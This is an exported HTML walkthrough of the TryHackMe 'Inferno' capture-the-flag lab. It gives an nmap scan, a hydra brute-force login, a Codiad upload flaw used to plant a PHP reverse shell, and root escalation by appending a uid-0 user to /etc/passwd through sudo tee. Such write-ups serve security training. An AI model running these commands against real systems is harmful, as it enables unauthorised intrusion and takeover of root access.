<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>inferno</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>inferno</h1><br/><p><strong><h1>THM Inferno</h1></strong></p><p></p><p><strong><h2>Enumeration :</h2></strong></p><p></p><p><strong><h4>Nmap Scan</h4></strong></p><p></p><p># Nmap 7.93 scan initiated Sun Jun 18 00:10:30 2023 as: nmap -A -p23,22,21,25,80,88,110,106,194,389,464,636,750,808,777,783,775,779,873,1001,1178,1210,1236,1313,1314,1300,1529,2000,2003,443,2121,2150,2604,2601,2605,2603,2600,2606,2602,2608,2607,2989,2988,4224,4557,4559,4600,4949,5052,5051,5151,5355,5354,5432,5555,5675,5667,5674,5666,5680,6346,6514,6566,6667,8021,8081,8088,8990,9098,9359,9418,9673,10000,10083,10082,10081,11201,15345,17004,17003,17001,17002,20012,20011,24554,27374,30865,57000,60177,60179 -oN nmap_intial.txt 10.10.46.0</p><p>Nmap scan report for 10.10.46.0</p><p>Host is up (0.16s latency).</p><p></p><p>PORT      STATE SERVICE           VERSION</p><p>21/tcp    open  ftp?</p><p>22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   2048 d7ec1a7f6274da2964b3ce1ee26804f7 (RSA)</p><p>|   256 de4feefa862efbbd4cdcf96773028434 (ECDSA)</p><p>|_  256 e26d8de1a8d0bd97cb9abc03c3f8d885 (ED25519)</p><p>23/tcp    open  telnet?</p><p>25/tcp    open  smtp?</p><p>|_smtp-commands: Couldn&#39;t establish connection on port 25</p><p>80/tcp    open  http              Apache httpd 2.4.29 ((Ubuntu))</p><p>|_http-server-header: Apache/2.4.29 (Ubuntu)</p><p>|_http-title: Dante&#39;s Inferno</p><p>88/tcp    open  kerberos-sec?</p><p>106/tcp   open  pop3pw?</p><p>110/tcp   open  pop3?</p><p>194/tcp   open  irc?</p><p>|_irc-info: Unable to open connection</p><p>389/tcp   open  ldap?</p><p>443/tcp   open  https?</p><p>464/tcp   open  kpasswd5?</p><p>636/tcp   open  ldapssl?</p><p>750/tcp   open  kerberos?</p><p>775/tcp   open  entomb?</p><p>777/tcp   open  multiling-http?</p><p>779/tcp   open  unknown</p><p>783/tcp   open  spamassassin?</p><p>808/tcp   open  ccproxy-http?</p><p>873/tcp   open  rsync?</p><p>1001/tcp  open  webpush?</p><p>1178/tcp  open  skkserv?</p><p>1210/tcp  open  eoss?</p><p>1236/tcp  open  bvcontrol?</p><p>1300/tcp  open  h323hostcallsc?</p><p>1313/tcp  open  bmc_patroldb?</p><p>1314/tcp  open  pdps?</p><p>1529/tcp  open  support?</p><p>2000/tcp  open  cisco-sccp?</p><p>2003/tcp  open  finger?</p><p>2121/tcp  open  ccproxy-ftp?</p><p>2150/tcp  open  dynamic3d?</p><p>2600/tcp  open  zebrasrv?</p><p>2601/tcp  open  zebra?</p><p>2602/tcp  open  ripd?</p><p>2603/tcp  open  ripngd?</p><p>2604/tcp  open  ospfd?</p><p>2605/tcp  open  bgpd?</p><p>2606/tcp  open  netmon?</p><p>2607/tcp  open  connection?</p><p>2608/tcp  open  wag-service?</p><p>2988/tcp  open  hippad?</p><p>2989/tcp  open  zarkov?</p><p>4224/tcp  open  xtell?</p><p>4557/tcp  open  fax?</p><p>4559/tcp  open  hylafax?</p><p>4600/tcp  open  piranha1?</p><p>4949/tcp  open  munin?</p><p>5051/tcp  open  ida-agent?</p><p>5052/tcp  open  ita-manager?</p><p>5151/tcp  open  esri_sde?</p><p>5354/tcp  open  mdnsresponder?</p><p>5355/tcp  open  llmnr?</p><p>5432/tcp  open  postgresql?</p><p>5555/tcp  open  freeciv?</p><p>5666/tcp  open  nrpe?</p><p>5667/tcp  open  unknown</p><p>5674/tcp  open  hyperscsi-port?</p><p>5675/tcp  open  v5ua?</p><p>5680/tcp  open  canna?</p><p>6346/tcp  open  gnutella?</p><p>6514/tcp  open  syslog-tls?</p><p>6566/tcp  open  sane-port?</p><p>6667/tcp  open  irc?</p><p>|_irc-info: Unable to open connection</p><p>8021/tcp  open  ftp-proxy?</p><p>8081/tcp  open  blackice-icecap?</p><p>8088/tcp  open  radan-http?</p><p>8990/tcp  open  http-wmap?</p><p>9098/tcp  open  unknown</p><p>9359/tcp  open  unknown</p><p>9418/tcp  open  git?</p><p>9673/tcp  open  unknown</p><p>10000/tcp open  snet-sensor-mgmt?</p><p>10081/tcp open  famdc?</p><p>10082/tcp open  amandaidx?</p><p>10083/tcp open  amidxtape?</p><p>11201/tcp open  smsqp?</p><p>15345/tcp open  xpilot?</p><p>17001/tcp open  unknown</p><p>17002/tcp open  unknown</p><p>17003/tcp open  unknown</p><p>17004/tcp open  unknown</p><p>20011/tcp open  unknown</p><p>20012/tcp open  ss-idi-disc?</p><p>24554/tcp open  binkp?</p><p>27374/tcp open  subseven?</p><p>30865/tcp open  unknown</p><p>57000/tcp open  unknown</p><p>60177/tcp open  unknown</p><p>60179/tcp open  unknown</p><p>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</p><p>Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)</p><p>No exact OS matches for host (test conditions non-ideal).</p><p>Network Distance: 5 hops</p><p>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p><p></p><p>TRACEROUTE (using port 443/tcp)</p><p>HOP RTT       ADDRESS</p><p>1   37.32 ms  10.17.0.1</p><p>2   ... 4</p><p>5   161.05 ms 10.10.46.0</p><p></p><p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p><p># Nmap done at Sun Jun 18 00:41:56 2023 -- 1 IP address (1 host up) scanned in 1885.85 seconds</p><p></p><p>There are a lot of open ports but they are TCP wrapped. Only SSH(22) &amp; Webserver(80) port are open.</p><p></p><p><strong>Web Directory Enumeration</strong></p><p></p><p>We will use gobuster to enumerate for directories. We used the medium list.</p><p></p><p><strong>gobuster dir -u http://10.10.142.54 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</strong></p><p></p><p><img src="images/64-1.png" alt="images/64-1.png" /></p><p></p><p>The status code states that the directory access is not authorized.</p><p></p><p><img src="images/64-2.png" alt="images/64-2.png" /></p><p></p><p><strong><h2>Foothold :</h2></strong><h2></h2></p><p><h2></h2></p><p>We will use hydra to brute force this login page. We can try usernames like admin, dante, dante1, root etc &amp; the rockyou password file.</p><p></p><p><strong>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.142.54 http-get /inferno</strong></p><p></p><p><img src="images/64-3.png" alt="images/64-3.png" /></p><p></p><p></p><p>After using this password in two entry pages we get to a codiad webinterface. We researched codiad in google &amp; usedthe following upload vulnerability in codiad to get initial foothold.</p><p></p><p><img src="images/64-4.png" alt="images/64-4.png" /></p><p></p><p></p><p>Go to the following location &amp; upload a php reverse shell. </p><p></p><p><img src="images/64-5.png" alt="images/64-5.png" /></p><p></p><p>The upload functionality will come after right clicking the file navigation icon.</p><p></p><p><img src="images/64-6.png" alt="images/64-6.png" /></p><p></p><p>Then we uploaded a php-reverse shell from <strong>https://github.com/pentestmonkey/php-reverse-shell</strong> after editing our listening tunnel IP &amp; port to the INF directory.</p><p><img src="images/64-7.png" alt="images/64-7.png" /></p><p></p><p>Once upload is complete, we start a listener &amp; go the exact path from the URL.</p><p></p><p><strong>http://10.10.142.54/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php</strong></p><p></p><p><img src="images/64-8.png" alt="images/64-8.png" /></p><p></p><p>As we can see, we have got initial access to the system.</p><p></p><p>We upgraded our shell to a python bash shell using the following commands.</p><p></p><p><strong>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</strong></p><p><strong>export TERM=xterm</strong></p><p><strong>CTRL+Z</strong></p><p><strong>stty raw -echo;fg</strong></p><p></p><p>Next, we found the <strong>local.txt</strong> file in <strong>/home/dante</strong> directory, but it is only accessible by the user <strong>dante</strong>. </p><p></p><p><img src="images/64-9.png" alt="images/64-9.png" /></p><p></p><p>We searched in dante&#39;s home directory &amp; found the following file. It had hex code which we decoded using cyberchef with From Hex recipe to get the credentials for dante.</p><p></p><p><img src="images/64-10.png" alt="images/64-10.png" /></p><p></p><p></p><p></p><p><img src="images/64-11.png" alt="images/64-11.png" /></p><p></p><p></p><p>We login the server using ssh &amp; above credentials. We get the user flag in the home directory.</p><p></p><p><img src="images/64-12.png" alt="images/64-12.png" /></p><p></p><p></p><p><strong><h2>Privilege Escalation :</h2></strong></p><p></p><p>We checked sudo and found tee was allowed to run with sudo privileges without any password by the user dante.</p><p></p><p><img src="images/64-13.png" alt="images/64-13.png" /></p><p></p><p>we use tee to write into <strong>/etc/passwd</strong> our user which we set the password using <strong>openssl</strong></p><p></p><p></p><p><strong>openssl passwd -6 -salt “ray” “pass123”</strong></p><p></p><p><img src="images/64-14.png" alt="images/64-14.png" /></p><p></p><p>we add the password into a user ray inside the /etc/passwd file &amp; switch to the user. Then get the contents of root flag.</p><p></p><p><strong>echo &#39;ray:$6$ray$pomzXXqZKzyGGGxaLfVILQrJkmd89yxQR6vbh46g8gHf8uSM1qlCFTATbHgyEwljGZgkXRv2nCyUiLLUdub480:0:0:root:/root:/bin/bash\n&#39; | sudo tee -a /etc/passwd</strong></p><p></p><p><img src="images/64-15.png" alt="images/64-15.png" /></p><p></p><p>Thanks !!</p></div>
</body>
</html>
